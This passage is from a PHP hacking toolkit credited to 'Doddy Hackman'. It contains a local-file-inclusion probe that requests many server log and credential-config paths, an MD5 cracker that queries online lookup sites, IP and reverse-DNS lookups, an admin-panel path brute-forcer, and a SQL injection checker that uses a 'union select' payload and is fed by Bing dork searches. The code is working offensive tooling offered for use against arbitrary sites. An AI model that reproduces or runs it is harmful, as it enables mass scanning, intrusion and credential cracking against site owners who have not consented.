'c:\WINDOWS\php.ini', 'c:\WINNT\php.ini', 'c:\apache\php\php.ini', 'c:\xampp\apache\bin\php.ini', 'c:\NetServer\bin\stable\apache\php.ini', 'c:\home2\bin\stable\apache\php.ini', 'c:\home\bin\stable\apache\php.ini', '/Volumes/Macintosh_HD1/usr/local/php/lib/php.ini', '/usr/local/cpanel/logs', '/usr/local/cpanel/logs/stats_log', '/usr/local/cpanel/logs/access_log', '/usr/local/cpanel/logs/error_log', '/usr/local/cpanel/logs/license_log', '/usr/local/cpanel/logs/login_log', '/var/cpanel/cpanel.config', '/var/log/mysql/mysql-bin.log', '/var/log/mysql.log', '/var/log/mysqlderror.log', '/var/log/mysql/mysql.log', '/var/log/mysql/mysql-slow.log', '/var/mysql.log', '/var/lib/mysql/my.cnf', 'C:\ProgramFiles\MySQL\MySQLServer5.0\data\hostname.err', 'C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql.log', 'C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql.err', 'C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql-bin.log', 'C:\ProgramFiles\MySQL\data\hostname.err', 'C:\ProgramFiles\MySQL\data\mysql.log', 'C:\ProgramFiles\MySQL\data\mysql.err', 'C:\ProgramFiles\MySQL\data\mysql-bin.log', 'C:\MySQL\data\hostname.err', 'C:\MySQL\data\mysql.log', 'C:\MySQL\data\mysql.err', 'C:\MySQL\data\mysql-bin.log', 'C:\ProgramFiles\MySQL\MySQLServer5.0\my.ini', 'C:\ProgramFiles\MySQL\MySQLServer5.0\my.cnf', 'C:\ProgramFiles\MySQL\my.ini', 'C:\ProgramFiles\MySQL\my.cnf', 'C:\MySQL\my.ini', 'C:\MySQL\my.cnf', '/etc/logrotate.d/proftpd', '/www/logs/proftpd.system.log', '/var/log/proftpd', '/etc/proftp.conf', '/etc/protpd/proftpd.conf', '/etc/vhcs2/proftpd/proftpd.conf', '/etc/proftpd/modules.conf', '/var/log/vsftpd.log', '/etc/vsftpd.chroot_list', '/etc/logrotate.d/vsftpd.log', '/etc/vsftpd/vsftpd.conf', '/etc/vsftpd.conf', '/etc/chrootUsers', '/var/log/xferlog', '/var/adm/log/xferlog', '/etc/wu-ftpd/ftpaccess', '/etc/wu-ftpd/ftphosts', '/etc/wu-ftpd/ftpusers', '/usr/sbin/pure-config.pl', '/usr/etc/pure-ftpd.conf', '/etc/pure-ftpd/pure-ftpd.conf', '/usr/local/etc/pure-ftpd.conf', '/usr/local/etc/pureftpd.pdb', '/usr/local/pureftpd/etc/pureftpd.pdb', '/usr/local/pureftpd/sbin/pure-config.pl', '/usr/local/pureftpd/etc/pure-ftpd.conf', '/etc/pure-ftpd/pure-ftpd.pdb', '/etc/pureftpd.pdb', '/etc/pureftpd.passwd', '/etc/pure-ftpd/pureftpd.pdb', '/var/log/pure-ftpd/pure-ftpd.log', '/logs/pure-ftpd.log', '/var/log/pureftpd.log', '/var/log/ftp-proxy/ftp-proxy.log', '/var/log/ftp-proxy', '/var/log/ftplog', '/etc/logrotate.d/ftp', '/etc/ftpchroot', '/etc/ftphosts', '/var/log/exim_mainlog', '/var/log/exim/mainlog', '/var/log/maillog', '/var/log/exim_paniclog', '/var/log/exim/paniclog', '/var/log/exim/rejectlog', '/var/log/exim_rejectlog');
    $code = toma($target . "'");
    $check_lfi = "0";
    if (preg_match("/No such file or directory in <b>(.*)<\/b> on line/i", $code)) {
        preg_match_all("/No such file or directory in <b>(.*)<\/b> on line/i", $code, $re);
        echo "\n\t\t\t[+] Full Path Discloure : " . $re[1][0];
        $check_lfi = "1";
    } elseif (preg_match("/No existe el fichero o el directorio in <b>(.*?)<\/b> on line/i", $code)) {
        preg_match_all("/No existe el fichero o el directorio in <b>(.*?)<\/b> on line/i", $code, $re);
        echo "\n\t\t\t[+] Full Path Discloure : " . $re[1][0];
        $check_lfi = "1";
    } else {
        echo "\n\t\t\t[-] Not Vulnerable";
        $check_lfi = "0";
    }
    if ($check_lfi == 1) {
        echo "\n\n\t\t\t[+] Searching files ...\n";
        foreach($files as $file) {
            $code = toma($target . $file);
            if (preg_match("/No such file or directory in <b>(.*)<\/b> on line/i", $code) or preg_match("/No existe el fichero o el directorio in <b>(.*?)<\/b> on line/i", $code)) {
            } else {
                echo "\n\t\t\t[+] : " . $target . $file;
            }
        }
        echo "\n\n\t\t\t[+] Finished";
    }
}
function crackmd5($hash) {
    echo "\n\t\t\t[+] " . $hash . " : ";
    $code = tomar("http://www.md5.net/cracker.php", "hash=" . $hash . "&submit=Crack");
    $check_error = "0";
    if (preg_match("/<input type=\"text\" id=\"hash\" size=\"(.*?)\" value=\"(.*?)\"/i", $code)) {
        preg_match_all("/<input type=\"text\" id=\"hash\" size=\"(.*?)\" value=\"(.*?)\"/i", $code, $re);
        if (preg_match("/Entry not found/", $re[2][0])) {
            $check_error = "0";
        } else {
            echo $re[2][0];
            $check_error = "1";
        }
    } else {
        echo "Not Found";
        $check_error = "0";
    }
    if ($check_error == 1) {
    } else {
        $code = tomar("http://md5online.net/index.php", "pass=" . $hash . "&option=hash2text&send=Submit");
        if (preg_match("/<center><p>md5 :<b>(.*?)<\/b> <br>pass : <b>(.*?)<\/b><\/p>/i", $code)) {
            preg_match_all("/<center><p>md5 :<b>(.*?)<\/b> <br>pass : <b>(.*?)<\/b><\/p>/i", $code, $re);
            echo $re[2][0];
        } else {
            $code = tomar("http://md5decryption.com/index.php", "hash=" . $hash . "&submit=Decrypt It!");
            if (preg_match("/Decrypted Text: <\/b>(.*?)<\/font>/i", $code)) {
                preg_match_all("/Decrypted Text: <\/b>(.*?)<\/font>/i", $code, $re);
                echo $re[1][0];
            } else {
                $code = tomar("http://md5.my-addr.com/md5_decrypt-md5_cracker_online/md5_decoder_tool.php", "md5=" . $hash);
                if (preg_match("/<span class='middle_title'>Hashed string<\/span>: (.*?)<\/div>/i", $code)) {
                    preg_match_all("/<span class='middle_title'>Hashed string<\/span>: (.*?)<\/div>/i", $code, $re);
                    echo $re[1][0];
                } else {
                    echo "Not Found";
                }
            }
        }
    }
}
function locateip($target) {
    $dame_host = parse_url($target);
    $hostname = $dame_host['host'];
    $ip = gethostbyname($hostname);
    echo "\n\t\t\t[+] Searching ...\n";
    $code = toma("http://www.melissadata.com/lookups/iplocation.asp?ipaddress=" . $ip);
    if (preg_match("/City<\/td><td align=(.*)><b>(.*)<\/b><\/td>/i", $code)) {
        preg_match_all("/City<\/td><td align=(.*)><b>(.*)<\/b><\/td>/i", $code, $re);
        echo "\n\t\t\t[+] City : " . $re[2][0];
    } else {
        echo "\n\t\t\t[+] City : Not Found";
    }
    if (preg_match("/Country<\/td><td align=(.*)><b>(.*)<\/b><\/td>/i", $code)) {
        preg_match_all("/Country<\/td><td align=(.*)><b>(.*)<\/b><\/td>/i", $code, $re);
        echo "\n\t\t\t[+] Country : " . $re[2][0];
    } else {
        echo "\n\t\t\t[+] Country : Not Found";
    }
    if (preg_match("/State or Region<\/td><td align=(.*)><b>(.*)<\/b><\/td>/i", $code)) {
        preg_match_all("/State or Region<\/td><td align=(.*)><b>(.*)<\/b><\/td>/i", $code, $re);
        echo "\n\t\t\t[+] State or Region : " . $re[2][0];
    } else {
        echo "\n\t\t\t[+] State or Region : Not Found";
    }
    echo "\n";
    $code = toma("http://www.ip-adress.com/reverse_ip/" . $ip);
    if (preg_match("/whois\/(.*?)\">Whois/i", $code)) {
        preg_match_all("/whois\/(.*?)\">Whois/i", $code, $re);
        $matches = $re[1];
        foreach($matches as $valor) {
            echo "\n\t\t\t[+] DNS Found : " . $valor;
        }
    }
    echo "\n\n\t\t\t[+] Finished";
}
function paneladmin($target) {
    $panels = array('admin/admin.asp', 'admin/login.asp', 'admin/index.asp', 'admin/admin.aspx', 'admin/login.aspx', 'admin/index.aspx', 'admin/webmaster.asp', 'admin/webmaster.aspx', 'asp/admin/index.asp', 'asp/admin/index.aspx', 'asp/admin/admin.asp', 'asp/admin/admin.aspx', 'asp/admin/webmaster.asp', 'asp/admin/webmaster.aspx', 'admin/', 'login.asp', 'login.aspx', 'admin.asp', 'admin.aspx', 'webmaster.aspx', 'webmaster.asp', 'login/index.asp', 'login/index.aspx', 'login/login.asp', 'login/login.aspx', 'login/admin.asp', 'login/admin.aspx', 'administracion/index.asp', 'administracion/index.aspx', 'administracion/login.asp', 'administracion/login.aspx', 'administracion/webmaster.asp', 'administracion/webmaster.aspx', 'administracion/admin.asp', 'administracion/admin.aspx', 'php/admin/', 'admin/admin.php', 'admin/index.php', 'admin/login.php', 'admin/system.php', 'admin/ingresar.php', 'admin/administrador.php', 'admin/default.php', 'administracion/', 'administracion/index.php', 'administracion/login.php', 'administracion/ingresar.php', 'administracion/admin.php', 'administration/', 'administration/index.php', 'administration/login.php', 'administrator/index.php', 'administrator/login.php', 'administrator/system.php', 'system/', 'system/login.php', 'admin.php', 'login.php', 'administrador.php', 'administration.php', 'administrator.php', 'admin1.html', 'admin1.php', 'admin2.php', 'admin2.html', 'yonetim.php', 'yonetim.html', 'yonetici.php', 'yonetici.html', 'adm/', 'admin/account.php', 'admin/account.html', 'admin/index.html', 'admin/login.html', 'admin/home.php', 'admin/controlpanel.html', 'admin/controlpanel.php', 'admin.html', 'admin/cp.php', 'admin/cp.html', 'cp.php', 'cp.html', 'administrator/', 'administrator/index.html', 'administrator/login.html', 'administrator/account.html', 'administrator/account.php', 'administrator.html', 'login.html', 'modelsearch/login.php', 'moderator.php', 'moderator.html', 'moderator/login.php', 'moderator/login.html', 'moderator/admin.php', 'moderator/admin.html', 'moderator/', 'account.php', 'account.html', 'controlpanel/', 'controlpanel.php', 'controlpanel.html', 'admincontrol.php', 'admincontrol.html', 'adminpanel.php', 'adminpanel.html', 'admin1.asp', 'admin2.asp', 'yonetim.asp', 'yonetici.asp', 'admin/account.asp', 'admin/home.asp', 'admin/controlpanel.asp', 'admin/cp.asp', 'cp.asp', 'administrator/index.asp', 'administrator/login.asp', 'administrator/account.asp', 'administrator.asp', 'modelsearch/login.asp', 'moderator.asp', 'moderator/login.asp', 'moderator/admin.asp', 'account.asp', 'controlpanel.asp', 'admincontrol.asp', 'adminpanel.asp', 'fileadmin/', 'fileadmin.php', 'fileadmin.asp', 'fileadmin.html', 'administration.html', 'sysadmin.php', 'sysadmin.html', 'phpmyadmin/', 'myadmin/', 'sysadmin.asp', 'sysadmin/', 'ur-admin.asp', 'ur-admin.php', 'ur-admin.html', 'ur-admin/', 'Server.php', 'Server.html', 'Server.asp', 'Server/', 'wp-admin/', 'administr8.php', 'administr8.html', 'administr8/', 'administr8.asp', 'webadmin/', 'webadmin.php', 'webadmin.asp', 'webadmin.html', 'administratie/', 'admins/', 'admins.php', 'admins.asp', 'admins.html', 'administrivia/', 'Database_Administration/', 'WebAdmin/', 'useradmin/', 'sysadmins/', 'admin1/', 'system-administration/', 'administrators/', 'pgadmin/', 'directadmin/', 'staradmin/', 'ServerAdministrator/', 'SysAdmin/', 'administer/', 'LiveUser_Admin/', 'sys-admin/', 'typo3/', 'panel/', 'cpanel/', 'cPanel/', 'cpanel_file/', 'platz_login/', 'rcLogin/', 'blogindex/', 'formslogin/', 'autologin/', 'support_login/', 'meta_login/', 'manuallogin/', 'simpleLogin/', 'loginflat/', 'utility_login/', 'showlogin/', 'memlogin/', 'members/', 'login-redirect/', 'sub-login/', 'wp-login/', 'login1/', 'dir-login/', 'login_db/', 'xlogin/', 'smblogin/', 'customer_login/', 'UserLogin/', 'login-us/', 'acct_login/', 'admin_area/', 'bigadmin/', 'project-admins/', 'phppgadmin/', 'pureadmin/', 'sql-admin/', 'radmind/', 'openvpnadmin/', 'wizmysqladmin/', 'vadmind/', 'ezsqliteadmin/', 'hpwebjetadmin/', 'newsadmin/', 'adminpro/', 'Lotus_Domino_Admin/', 'bbadmin/', 'vmailadmin/', 'Indy_admin/', 'ccp14admin/', 'irc-macadmin/', 'banneradmin/', 'sshadmin/', 'phpldapadmin/', 'macadmin/', 'administratoraccounts/', 'admin4_account/', 'admin4_colon/', 'radmind-1/', 'Super-Admin/', 'AdminTools/', 'cmsadmin/', 'SysAdmin2/', 'globes_admin/', 'cadmins/', 'phpSQLiteAdmin/', 'navSiteAdmin/', 'server_admin_small/', 'logo_sysadmin/', 'server/', 'database_administration/', 'power_user/', 'system_administration/', 'ss_vms_admin_sm/');
    @set_time_limit(20);
    echo "\n\t\t\t" . "[+] Searching panels in " . $target . "\n";
    foreach($panels as $panel) {
        if (tomax($target . "/" . $panel) == 200) {
            echo "\n\t\t\t[+] Link : " . $target . "/" . $panel;
        }
    }
    echo "\n\n\t\t\t" . "[+] Finished";
}
//$code = toma("http://www.petardas.com/index.php");
//if(preg_match("/Sexo/i", $code)) {
//echo "yeah";
//}
//$code = tomar("http://localhost:8080/labs/post.php","probar=fuckyou&con=forear");
//if(preg_match("/fuckyou/i", $code)) {
//echo "yeah";
//}
//checksql("http://localhost:8080/labs/sql.php?id=ddsa");
//scanner_bing("noticias.php+id","5");
function checksql($target) {
    if (preg_match('/(.*)=(.*)/i', $target)) {
        preg_match_all('/(.*)=(.*)/i', $target, $re);
        $code = toma($re[1][0] . "=-1+union+select+1--");
        if (preg_match('/The used SELECT statements have a different number of columns/i', $code)) {
            echo "\n\t\t\t[+] SQLI : " . $re[1][0] . "=";
        }
    }
}
function scanner_bing($dork, $paginas) {
    echo "\n\t\t\t[+] Scanning ...\n";
    $valor = "10" * $paginas;
    $valorz = (int)$valor;
    for ($i = 10;$i <= $valorz;$i+= 10) {
        $code = toma("http://www.bing.com/search?q=" . $dork . "&first=" . $i);
        if (preg_match('/<h3><a href="(.*?)"/i', $code)) {
            preg_match_all('/<h3><a href="(.*?)"/i', $code, $re);
            $reco = $re[1];
            foreach($reco as $target) {
                checksql($target);
            }
        }
    }
    echo "\n\n\t\t\t[+] Finished\n";
}
function hexdecode($texto) {
    // Credits
    // Based on : http://stackoverflow.com/questions/14674834/php-convert-string-to-hex-and-hex-to-string
    $final = "";
    for ($num = 0;$num < strlen($texto) - 1;$num+= 2) {
        $final.= chr(hexdec($texto[$num] . $texto[$num + 1]));
    }
    return $final;
}
function hex($texto) {
    // Credits
    // Based on : http://stackoverflow.com/questions/14674834/php-convert-string-to-hex-and-hex-to-string
    $final = "";
    for ($num = 0;$num < strlen($texto);$num++) {
        $final.= substr('0' . dechex(ord($texto[$num])), -2);
    }
    return "0x" . $final;
}
function tomax($target) {
    $nave = curl_init($target);
    curl_setopt($nave, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0');
    curl_setopt($nave, CURLOPT_TIMEOUT, 5);
    curl_setopt($nave, CURLOPT_RETURNTRANSFER, true);
    $resultado = curl_exec($nave);
    return curl_getinfo($nave, CURLINFO_HTTP_CODE);
}
function toma($target) {
    $nave = curl_init($target);
    curl_setopt($nave, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0');
    curl_setopt($nave, CURLOPT_TIMEOUT, 5);
    curl_setopt($nave, CURLOPT_RETURNTRANSFER, true);
    return curl_exec($nave);
}
function tomar($target, $params) {
    $nave = curl_init($target);
    curl_setopt($nave, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0');
    curl_setopt($nave, CURLOPT_TIMEOUT, 5);
    curl_setopt($nave, CURLOPT_POST, true);
    curl_setopt($nave, CURLOPT_POSTFIELDS, $params);
    curl_setopt($nave, CURLOPT_RETURNTRANSFER, true);
    return curl_exec($nave);
}
function darcolor() {
    echo "<!-- This program has been programmed by Doddy Hackman in the year 2014 -->";
    echo '<style type="text/css">
 
 
.main {
margin            : -287px 0px 0px -490px;
border            : White solid 1px;
BORDER-COLOR: #00FF00;
}
 
 
#pie {
position: absolute;
bottom: 0;
}
 
body,a:link {
background-color: #000000;
color:#00FF00;
Courier New;
cursor:crosshair;
font-size: small;
}
 
input,table.outset,table.bord,table,textarea,select,fieldset,td,tr {
font: normal 12px Verdana, Arial, Helvetica,
sans-serif;
background-color:black;color:#00FF00;
border: solid 1px #00FF00;
border-color:#00FF00
}
 
a:link,a:visited,a:active {
color: #00FF00;
font: normal 17px Verdana, Arial, Helvetica,
sans-serif;
text-decoration: none;
}

</style>
';
}
echo "<!-- The End ? -->";

// The End ?

?>